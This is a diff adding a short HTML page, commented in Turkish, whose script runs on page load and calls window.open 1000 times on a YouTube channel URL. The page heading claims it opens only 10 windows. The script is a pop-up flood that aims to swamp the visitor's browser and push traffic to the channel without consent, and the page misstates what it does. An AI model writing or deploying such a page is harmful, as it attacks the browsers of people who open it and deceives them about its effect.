@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otomatik Yeni Pencere Açma</title>
+</head>
+<body>
+    <h1>10 Yeni Pencere Açılıyor...</h1>
+
+    <script>
+        function openMultipleWindows() {
+            for (let i = 0; i < 1000; i++) {
+                window.open("https://www.youtube.com/@octopislol", "_blank", "width=800,height=600");
+            }
+        }
+
+        // Sayfa yüklendiğinde fonksiyonu çalıştır
+        window.onload = openMultipleWindows;
+    </script>
+</body>
+</html>
